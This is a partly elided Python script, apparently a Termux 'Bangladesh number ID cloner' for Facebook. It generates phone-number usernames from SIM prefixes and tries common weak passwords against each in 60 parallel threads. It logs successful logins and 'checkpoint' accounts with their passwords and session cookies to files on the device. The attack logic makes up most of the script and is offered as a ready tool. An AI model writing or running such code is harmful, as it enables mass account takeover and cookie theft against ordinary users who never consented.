...
\033[1;32m==================================================
          ...
          Facebook   : SHOAIB.401
          Github     : SHOAIB-404   
          Version    : \033[1;96mFree\x1b[0m\033[1;31m [3.1] \x1b[0m
\033[1;31m==================================================           
...
def ATC():
	os.system('clear')
	print(logo)
	print("\033[1;31m[\033[1;96m1\033[1;31m] \033[1;32mRANDOM CLONING")
	print("\033[1;31m[\033[1;96m2\033[1;31m] \033[1;32mSUBSCRIBE MY CHANNEL")
	print('\033[1;31m[\033[1;96m0\033[1;31m] \033[1;31mEXIT')
	print(f"\033[1;31m===================")
	atc = input('[+] CHOOSE OPTION : ')
	if atc in ["01","1"]:
		rnd()
	if atc in ["02","2"]:
		os.system('xdg-open https://t.me/The_Monster_401');ATC
	if atc in ["E","0"]:
		exit("[+] TANKS FOR USE")
	else:
		print('[+]\033[1;91m CHOOSE VALID OPTION\033[0;97m');time.sleep(1)
		ATC()
...
def rnd():
	...
	os.system('clear')
	print(logo)
	print("\033[1;32mâ”â”[+] BD SIM CODE :\033[1;32m 017 015 018 019 013 015 016\033[1;97m]")
	kode = input('â”—â”[+] SELECT :\033[1;92m ')
	doamin = ' BD Number id cloner [ONLY-OK] '
	print('\033[1;32mâ”â”[+] EXAMPLE :\033[1;91m 1000, 2000, 3000, 5000, 10000\033[1;97m]')
	limit = int(input('â”—â”[+] LIMIT :\033[1;32m '))
	...
	with ThreadPool(max_workers=60) as yaari:
		...
		print(logo)
		tl = str(len(user))
		print('\033[1;32mâ”â”[+] COUNTRY    : Bangladesh')
		print('\033[1;32mâ”£â”[+] TOTAL ID   :\033[1;92m '+tl)
		print(f'\033[1;32mâ”£â”[+] SIM CODE   :\033[1;92m {kode} ')
		print('\033[1;32mâ”—â”[+] \033[1;91mON/OFF YOUR MOBILE DATA BEFORE USE')
		print('\033[1;32m==================================================')
		for guru in user:
			uid = kode+koda+kodb+guru
			pwx = [koda+kodb+guru,kodb+guru,kode+koda+kodb,kode+kode,kode+'123',kode+'1234','FREE FIRE','free fire','Bangladesh','i love you']
...
def b(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r\033[1;33m[SHOAIB AHAMED] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[65:80]
                print(f'\r\33[1;92m[SHOAIB-OK] '+cid+' | '+ps+'\33[0;97m')
                os.system("espeak \"SHOAIB, OK, ID \"")
                print(f'\r\033[1;97m[ðŸª]COOKIE :\033[1;92m '+coki)
                cek_apk(session,coki)
                oks.append(cid)
                open('/sdcard/BD-OK.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
                print(f'\r\33[1;91m[SHOAIB-CP] '+cid+' | '+ps+'\33[0;97m')
                open('/sdcard/BD-CP.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
                cps.append(cid)
                break
            else:
                continue
